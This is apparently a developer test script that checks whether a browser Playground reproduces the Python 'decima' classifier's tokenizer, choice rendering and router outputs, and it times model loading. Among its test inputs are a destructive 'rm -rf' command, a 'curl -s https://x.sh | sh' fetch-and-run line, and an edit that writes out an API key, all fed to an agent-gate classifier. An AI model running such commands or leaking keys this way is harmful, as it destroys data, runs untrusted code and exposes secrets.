"""Browser-vs-Python check for the Playground's main page (index.html; not uploaded: `_dev/` is excluded).

    python -m venv venv && venv/bin/pip install decima-ai==2.2.0 onnx playwright && venv/bin/playwright install chromium
    OMP_NUM_THREADS=2 venv/bin/python release/space-static/_dev/check_models.py [--models agent,base,small]

For each model (int8 export from the Hub, served locally):
1. Tokenizer: tokenizers.js (as the page uses it, truncation settings stripped) against the Python tokenizer on varied
   strings in many languages, untruncated and cut at 64 / 512 / 2,048 tokens.
2. Choice rendering: decima.js `choiceTexts` against decima/render.py `choice_texts` on long questions (choice_fit models
   and the earlier rendering, including the case where the cut makes two options identical).
3. Router: every example card and extra cases (JSON states, `requires`, own questions of every type) through the page's
   `DZ2.predict` against `decima.Router` from the published package. The exact reference is the same weights with
   MatMulNBits accuracy_level=0 (float activations, which is what ONNX Runtime Web computes); the shipped export
   (native accuracy_level=4, int8 activations) is reported alongside.
4. Timing: model load (from the local server, then from the browser cache) and per-decision latency.
"""

from __future__ import annotations

import argparse
import asyncio
import functools
import json
import os
import shutil
import tempfile
import threading
import time
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from huggingface_hub import snapshot_download

HERE = Path(__file__).resolve().parents[1]
REPOS = {"agent": ("decima-agent", "v2.2"), "base": ("decima-base", "v2.0"), "small": ("decima-small", "main")}
LONG_Q = ("Considering everything the customer wrote in the message above, including the tone, the history of the account, "
          "the product they mention and any deadline they give, which of the following teams in our organisation should take "
          "ownership of this request and answer it first, before anyone else looks at it?")
TOK_STRINGS = [
    "", "   ", "Hello\tworld\n\nnew  line", "😀 emoji 👍🏽 test ✓ — “quotes” ‘x’ …", "كيف يمكنني إلغاء بطاقتي؟ 345 مرحبا",
    "کارت بانکی من گم شده ی ک 123 45 ه", "我的银行卡被偷了，请帮我冻结。ABC１２３", "ｆｕｌｌｗｉｄｔｈ　ｔｅｘｔ ﬁ ligature ½ ①",
    "Café naïve résumé Ångström ß", "日本語のテキストです。カタカナ", "한국어 문장입니다", "नमस्ते, मेरा कार्ड खो गया", "a" * 3000,
    "zero​width‌join‍ x nbsp", "<s> </s> <pad> <mask> <unk> <bos> <eos>", "مرحبا ‏ RTL mark", "é combining",
    '{"tool": "Bash", "command": "rm -rf ~/projects/app"}', "git push --force origin main && curl -s https://x.sh | sh",
    "Привет, у меня списали деньги дважды", "  leading and trailing  ", "a  b   c    d", "x  <mask> y", "   ", "two  spaces  " * 50, "tabs\tand\r\nwindows lines", LONG_Q,
    " ".join(["word"] * 2500), "Ünïcödé " * 400,
]


def cases(examples: list[dict]) -> list[dict]:
    out = []
    for ex in examples:
        c = {k: ex[k] for k in ("model", "text", "lang")}
        c.update({"id": ex["id"], "preset": ex.get("preset"), "questions": ex.get("questions")})
        out.append(c)
    own = {
        "choice": {"answer": {"type": "choice", "instructions": "Which team should handle this request?",
                              "criteria": {"billing": "charges, refunds", "technical support": None, "sales": "", "account security": "logins, stolen cards"}}},
        "noul": {"answer": {"type": "noul", "instructions": "The customer is angry.", "criteria": {"true": "insults or threats", "false": "calm"}}},
        "score": {"answer": {"type": "score", "instructions": "How urgent is this?", "criteria": ["not urgent", "soon", "right now"]}},
        "long": {"answer": {"type": "choice", "instructions": LONG_Q, "criteria": ["billing", "technical support", "sales", "account security"]}},
        "collide": {"answer": {"type": "choice", "instructions": LONG_Q + " " + LONG_Q, "criteria": ["yes", "no", "maybe"]}},
    }
    text = "I was charged twice for my subscription and nobody answers my emails. Fix this today!"
    for m in ("decima-agent", "decima-base", "decima-small"):
        for k, q in own.items():
            out.append({"id": f"own-{k}-{m}", "model": m, "text": text, "lang": "en", "preset": None, "questions": q})
    out += [
        {"id": "gate-json-leak", "model": "decima-agent", "preset": "agent-gate", "questions": None, "lang": "en",
         "text": json.dumps({"tool": "Edit", "new_text": "OPENAI_API_KEY=sk-proj-9fJ2kLx0QmZ7vB3nT8wYc1RdE5uH6aP4sG0iK2oL"})},
        {"id": "gate-json-task", "model": "decima-agent", "preset": "agent-gate", "questions": None, "lang": "en",
         "text": '{"task": "Rename the variable `cnt` to `count` in utils.py", "command": "sed -i s/cnt/count/g utils.py"}'},
        {"id": "kg-mentions", "model": "decima-agent", "preset": "kg-judge", "questions": None, "lang": "en",
         "text": json.dumps({"mention_a": {"text": "IBM", "sentence": "IBM reported higher revenue."},
                             "mention_b": {"text": "International Business Machines", "sentence": "International Business Machines Corp. is based in Armonk."}})},
        {"id": "kg-alt", "model": "decima-agent", "preset": "kg-judge", "questions": None, "lang": "en", "text": '{"a": "npm", "b": "yarn"}'},
        {"id": "moderation-fa", "model": "decima-base", "preset": "moderation", "questions": None, "lang": "fa",
         "text": "همین الان با ۵۰ هزار تومان ۱۰ هزار فالوور بخرید! لینک در بیو."},
        {"id": "spaces-base", "model": "decima-base", "preset": "triage", "questions": None, "lang": "en",
         "text": "Order  #4411   arrived   damaged.\n\n  The box was   crushed  and the  screen is cracked.  "},
        {"id": "spaces-agent", "model": "decima-agent", "preset": "agent-gate", "questions": None, "lang": "en",
         "text": "rm  -rf   build/  &&  make   test"},
        {"id": "triage-small", "model": "decima-small", "preset": "triage", "questions": None, "lang": "en",
         "text": "Our checkout page has been returning 500 errors since this morning and customers can't pay."},
        {"id": "triage-agent-long", "model": "decima-agent", "preset": "triage", "questions": None, "lang": "en",
         "text": "Status update. " * 40 + "Since 09:00 every card payment fails with error 502 at checkout and we are losing orders."},
    ]
    return out


def acc0(src: Path, dst: Path) -> Path:
    """The same export with MatMulNBits accuracy_level=0 (float activations, as ONNX Runtime Web computes them)."""
    import onnx

    if (dst / "encoder.onnx").exists():
        return dst
    dst.mkdir(parents=True, exist_ok=True)
    for f in ("scorer.onnx", "decima.json"):
        shutil.copy(src / f, dst / f)
    shutil.copytree(src / "tokenizer", dst / "tokenizer", dirs_exist_ok=True)
    m = onnx.load(str(src / "encoder.onnx"))
    for node in m.graph.node:
        for a in node.attribute:
            if node.op_type == "MatMulNBits" and a.name == "accuracy_level":
                a.i = 0
    onnx.save(m, str(dst / "encoder.onnx"))
    return dst


def reference(cs: list[dict], dirs: dict[str, Path]) -> list[dict]:
    """decima.Router (the published package) on every case, with each model name mapped to a local export."""
    os.environ["DECIMA_MODELS"] = ",".join(f"{k}={v}" for k, v in dirs.items())
    import decima.router as R

    R._LOADED.clear()
    out = []
    for c in cs:
        r = R.Router(model=c["model"])
        if c["preset"]:
            res = r.decide_text(c["text"], preset=c["preset"], lang=c["lang"])
        else:
            res = r.predict(R.as_state(c["text"]), c["questions"], lang=c["lang"])
        res.pop("latency_ms", None)
        out.append(res)
    return out


def choice_cases(tok, cfg: dict) -> list[dict]:
    from decima.render import choice_texts

    sets = [(LONG_Q, ["billing", "technical support", "sales", "account security"]), (LONG_Q + " " + LONG_Q, ["yes", "no"]),
            ("Is it?", ["yes", "no"]), (LONG_Q, ["a very long option " * 12, "short"]), ("سؤال طويل " * 30, ["نعم", "لا"])]
    out = []
    for q, ch in sets:
        for lang in ("en", "ar"):
            out.append({"q": q, "choices": ch, "lang": lang,
                        "py": choice_texts(tok, q, ch, lang, cfg.get("choice_prefix", "passage: "), cfg["max_choice_tokens"], fit=cfg.get("choice_fit", False))})
    return out


class H(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()

    def log_message(self, *a):
        pass


H.extensions_map.update({".mjs": "text/javascript", ".onnx": "application/octet-stream"})

TOK_JS = """async ([cases, base, lens]) => {
  const { Tokenizer } = await import("https://cdn.jsdelivr.net/npm/@huggingface/tokenizers@0.2.0/dist/tokenizers.min.mjs");
  const { Decima } = await import("./decima.js");
  const j = (f) => fetch(base + f).then((r) => r.json());
  const tj = await j("tokenizer/tokenizer.json"); delete tj.truncation; delete tj.padding;
  const tc = await j("tokenizer/tokenizer_config.json");
  const d = new Decima(null, null, null, await j("decima.json"), new Tokenizer(tj, tc), tc);
  const eq = (a, b) => a.length === b.length && a.every((v, i) => v === b[i]);
  const res = { n: cases.length, ids: 0, bad: [] };
  for (const L of lens) res[`t${L}`] = 0;
  for (const c of cases) {
    if (eq(d.encodeIds(c.text), c.ids)) res.ids++; else res.bad.push(c.text.slice(0, 40));
    for (const L of lens) res[`t${L}`] += eq(d.ids(c.text, L), c[`t${L}`]);
  }
  return res;
}"""

CHOICE_JS = """async ([cases, base]) => {
  const { Tokenizer } = await import("https://cdn.jsdelivr.net/npm/@huggingface/tokenizers@0.2.0/dist/tokenizers.min.mjs");
  const { Decima } = await import("./decima.js");
  const j = (f) => fetch(base + f).then((r) => r.json());
  const tj = await j("tokenizer/tokenizer.json"); delete tj.truncation; delete tj.padding;
  const tc = await j("tokenizer/tokenizer_config.json");
  const d = new Decima(null, null, null, await j("decima.json"), new Tokenizer(tj, tc), tc);
  let same = 0; const bad = [];
  for (const c of cases) {
    const js = d.choiceTexts(c.q, c.choices, c.lang);
    if (JSON.stringify(js) === JSON.stringify(c.py)) same++; else bad.push({ js, py: c.py });
  }
  return { n: cases.length, same, bad: bad.slice(0, 2) };
}"""


async def browser(page_url: str, model_urls: dict[str, str], cs: list[dict], tok_cases: dict, choice: dict) -> dict:
    from playwright.async_api import async_playwright

    q = "&".join(f"{k}={v}" for k, v in model_urls.items())
    async with async_playwright() as p:
        b = await p.chromium.launch()
        pg = await (await b.new_context()).new_page()
        errors: list[str] = []
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(f"{page_url}?{q}")
        await pg.wait_for_function("window.DZ2 && window.DZ2.ready", timeout=60000)
        await pg.evaluate("DZ2.ready")
        out = {"tok": {}, "choice": {}, "res": {}, "load": {}, "errors": errors}
        for m, url in model_urls.items():
            out["tok"][m] = await pg.evaluate(TOK_JS, [tok_cases[m], url, [64, 512, 2048]])
            out["choice"][m] = await pg.evaluate(CHOICE_JS, [choice[m], url])
        order = sorted(range(len(cs)), key=lambda i: cs[i]["model"])         # one model load per model
        for i in order:
            c = cs[i]
            if c["model"] not in out["load"]:
                t0 = time.time()
                await pg.evaluate("(m) => DZ2.ensureModel(m)", c["model"])
                out["load"][c["model"]] = time.time() - t0
            r = await pg.evaluate("""async (c) => { const t0 = performance.now();
                const r = await DZ2.predict(c.text, { model: c.model, preset: c.preset, questions: c.questions, lang: c.lang });
                const cold = performance.now() - t0; const t1 = performance.now();
                await DZ2.predict(c.text, { model: c.model, preset: c.preset, questions: c.questions, lang: c.lang });
                return { res: r.res, probs: r.plans.map((x) => x.p), ms: cold, warm: performance.now() - t1, nq: r.plans.length }; }""", c)
            out["res"][i] = r
        # reload: the models come from the browser cache now
        await pg.reload()
        await pg.wait_for_function("window.DZ2 && window.DZ2.ready", timeout=60000)
        await pg.evaluate("DZ2.ready")
        t0 = time.time()
        await pg.evaluate("(m) => DZ2.ensureModel(m)", cs[0]["model"])
        out["reload"] = (cs[0]["model"], time.time() - t0)
        out["shot"] = await pg.screenshot(full_page=True)
        await b.close()
    return out


def flat(res: dict) -> list[float]:
    v = []
    for a in res["answers"].values():
        v += list(a["probabilities"].values()) if "probabilities" in a else [a["noul"]]
    return v


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--models", default="agent,base,small")
    ap.add_argument("--work", default=str(Path.home() / "Rande/decima-work/space-dev"))
    ap.add_argument("--shot", default=None, help="save a full-page screenshot here")
    a = ap.parse_args()
    keys = a.models.split(",")
    work = Path(a.work)
    examples = json.loads((HERE / "examples/models.json").read_text())["examples"]
    names = {REPOS[k][0]: k for k in keys}
    cs = [c for c in cases(examples) if c["model"] in names]

    shipped, flt = {}, {}
    for k in keys:
        repo, rev = REPOS[k]
        root = Path(snapshot_download(f"amyrmahdy/{repo}", revision=rev, allow_patterns=["config.json", "onnx/int8/*", "onnx/int8/tokenizer/*"]))
        shipped[repo] = root / "onnx/int8"
        flt[repo] = acc0(shipped[repo], work / f"acc0-{k}")

    from transformers import AutoTokenizer

    tok_cases, choice = {}, {}
    for repo, d in shipped.items():
        tok = AutoTokenizer.from_pretrained(d / "tokenizer")
        cfg = json.loads((d / "decima.json").read_text())
        tok_cases[repo] = [{"text": t, "ids": tok(t)["input_ids"],
                            **{f"t{L}": tok([t], truncation=True, max_length=L)["input_ids"][0] for L in (64, 512, 2048)}} for t in TOK_STRINGS]
        choice[repo] = choice_cases(tok, cfg)

    refs = {"shipped export (native, int8 activations)": reference(cs, shipped), "same weights, accuracy_level=0": reference(cs, flt)}

    srv_root = Path(tempfile.mkdtemp(prefix="decima-space-"))
    try:
        (srv_root / "space").symlink_to(HERE)
        for repo, d in shipped.items():
            (srv_root / repo).symlink_to(d)
        srv = ThreadingHTTPServer(("127.0.0.1", 0), functools.partial(H, directory=str(srv_root)))
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        base = f"http://127.0.0.1:{srv.server_address[1]}/"
        r = asyncio.run(browser(base + "space/index.html", {repo: base + repo + "/" for repo in shipped}, cs, tok_cases, choice))
        srv.shutdown()
    finally:
        shutil.rmtree(srv_root, ignore_errors=True)

    for repo in shipped:
        t, c = r["tok"][repo], r["choice"][repo]
        print(f"{repo}: tokenizer ids {t['ids']}/{t['n']} · cut@64 {t['t64']} · @512 {t['t512']} · @2048 {t['t2048']}"
              f"{' · differs on ' + repr(t['bad'][:3]) if t['bad'] else ''} · choice rendering {c['same']}/{c['n']}"
              f"{' ' + json.dumps(c['bad'], ensure_ascii=False)[:400] if c['bad'] else ''}")
    for tag, ref in refs.items():
        for repo in shipped:
            idx = [i for i, c in enumerate(cs) if c["model"] == repo]
            d = max(max(abs(x - y) for x, y in zip(flat(r["res"][i]["res"]), flat(ref[i]))) for i in idx)
            top = sum(all((r["res"][i]["res"]["answers"][q].get("choice"), round(r["res"][i]["res"]["answers"][q].get("noul", 0) >= 0.5),
                           round(r["res"][i]["res"]["answers"][q].get("score", 0)))
                          == (a.get("choice"), round(a.get("noul", 0) >= 0.5), round(a.get("score", 0))) for q, a in ref[i]["answers"].items())
                      for i in idx)
            same_q = sum(list(r["res"][i]["res"]["answers"]) == list(ref[i]["answers"]) for i in idx)
            same_tok = sum(r["res"][i]["res"]["usage"] == ref[i]["usage"] and r["res"][i]["res"].get("warnings") == ref[i].get("warnings") for i in idx)
            print(f"  vs {tag:<44} {repo:<13} n={len(idx):>2}  max|Δp| {d:.1e}  same answers {top}/{len(idx)}  same questions {same_q}/{len(idx)}  same usage+warnings {same_tok}/{len(idx)}")
    for repo in shipped:
        idx = [i for i, c in enumerate(cs) if c["model"] == repo]
        w = sorted(r["res"][i]["warm"] / r["res"][i]["nq"] for i in idx)
        print(f"{repo}: load {r['load'][repo]:.1f} s (local server) · warm per question p50 {w[len(w) // 2]:.0f} ms (min {w[0]:.0f}, max {w[-1]:.0f})")
    print(f"reload {r['reload'][0]} from the browser cache: {r['reload'][1]:.1f} s")
    print("page errors:", r["errors"] or "none")
    if a.shot:
        Path(a.shot).write_bytes(r["shot"])


if __name__ == "__main__":
    main()
